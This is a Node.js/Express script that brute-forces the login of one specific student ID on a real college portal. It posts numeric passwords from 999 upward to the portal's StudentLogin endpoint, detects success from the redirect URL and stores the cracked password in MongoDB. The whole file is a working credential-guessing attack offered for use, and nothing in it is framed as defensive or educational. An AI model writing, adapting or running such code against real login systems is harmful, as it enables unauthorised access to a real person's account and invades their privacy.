import Password from "./PawwordSchema.js";
import mongoose from "mongoose";
import dotenv from 'dotenv';
import express from 'express';
import fetch from 'node-fetch';

dotenv.config({ path: './.env' });

const app = express();
const port = 3000;

let i;
let isInitiated;
const username = 2412232;
const fail_url = "https://agclms.in/Elogin/StudentLogin";
const succ_url = "https://agclms.in/DashBoardStudent";

async function connectDB() {
    if (mongoose.connection.readyState === 0) {
        await mongoose.connect(process.env.MONGODB_URI);
        console.log("Connected to MongoDB");
    }
}

app.get('/', (req, res) => {
    if (isInitiated) return res.send(`Initiated, current check ${i}`);
    isInitiated = true;
    main();
    res.send('Initiated');
});

app.listen(port, () => {
    console.log(`App listening on port ${port}`);
});

const main = async () => {
    try {
        for (i = 999; i <= 9999999999; i++) {
            const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
                method: "POST",
                headers: {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8,pa;q=0.7",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cache-Control": "max-age=0"
                },
                referrer: "https://agclms.in/Elogin/StudentLogin",
                body: `StudentId=${username}&Password=${i}&__RequestVerificationToken=YOUR_TOKEN_HERE`
            });

            if (response.url === fail_url) {
                console.log(`Attempted: ${i}`);
            } else if (response.url === succ_url) {
                await connectDB();
                console.log(`Password found: ${i}`);

                const password = new Password({ password: i });
                await password.save();
                return;
            } else {
                console.error('Unexpected URL:', response.url);
                return;
            }
        }
    } catch (err) {
        console.error('Main error:', err);
    }
};
